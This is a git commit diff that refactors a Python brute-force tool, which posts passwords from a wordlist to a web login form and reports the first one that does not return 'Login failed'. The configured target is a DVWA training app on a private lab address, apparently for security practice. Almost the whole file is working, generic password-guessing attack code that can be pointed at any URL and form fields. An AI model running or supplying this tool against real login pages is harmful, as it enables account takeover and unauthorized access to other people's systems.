e99c1f402b6b6a9937bdebdba0178c79f71117be
Shashwat-Shah44 <technologyenglish05@gmail.com>
2021-09-22 15:18:47 +0530

    Making The Program Faster

--- Brute_Force/HTTP_POST/Automated/Brute_Force.py
+++ Brute_Force/HTTP_POST/Automated/Brute_Force.py
@@ -1,48 +1,43 @@
 import sys
-from important_static_functions import *
-from datetime import datetime
 import requests
-import queue
 from termcolor import colored
 
 
-def wordlist_build(file_path):
-    # is_resume = False
-    words = queue.Queue()
-
-    with open(file_path) as fp:
-        raw = fp.readline()
-        while raw:
-            word = raw.strip()
-            words.put(word)
-            raw = fp.readline()
-
-    fp.close()
-    return words
-
-
-def brute_force(url, username, username_field, password_field, submit_field_name,  verification, word_queue):
-    number = 1
-    while not word_queue.empty():
-        try_this = word_queue.get()
-        data = {
-            username_field: username,
-            password_field: try_this,
-            submit_field_name: 'submit'
-        }
-        response = requests.post(url, data=data)
+def proper_response(url, data, verification, word, number, verbose):
+    response = requests.post(url, data=data)
+    if verbose is not None:
         if verification not in response.content.decode('utf-8'):
-            print(colored(f'[+] Working On {number}\t\t\tPassword Found "{try_this}"', 'green'))
+            print(colored(f'[+] Working On {number}\t\tPassword Found "{word}"', 'blue'))
             sys.exit(0)
         else:
-            print(colored(f'[-] Working On {number}\t\t\tPassword Invalid "{try_this}"', 'red'))
+            print(colored(f'[-] Working On {number}\t\tPassword Invalid "{word}"', 'red'))
+    else:
+        if verification not in response.content.decode('utf-8'):
+            print(colored(f'[+] Password Number {number} in given wordlist\t\tPassword Found "{word}"', 'blue'))
+            sys.exit(0)
+
+
+def brute_force(url, username, username_field, password_field, submit_field_name, verification, word_queue,
+                verbose=None):
+    number = 1
+    words = word_queue.readlines()
+    for word in words:
+        word = word.strip()
+        data = {
+            username_field: username,
+            password_field: word,
+            submit_field_name: 'submit'
+        }
+        proper_response(url, data, verification, word, number, verbose,)
         number += 1
 
 
 def main():
-    fix_color_output()
-    passwords = wordlist_build('passwords.txt')
-    brute_force('http://192.168.56.101/dvwa/login.php', 'admin', 'username', 'password', 'Login', 'Login failed', passwords)
+    # fix_color_output()
+    passwords = open('../../../wordlist/passwords.txt')
+    brute_force('http://192.168.56.101/dvwa/login.php', 'admin', 'username', 'password', 'Login',
+                'Login failed', passwords, verbose=True)
+    # python start.py -l admin -p passwords.txt -u http://192.168.56.101/dvwa/login.php -v "Login failed"
 
 
 if __name__ == '__main__':
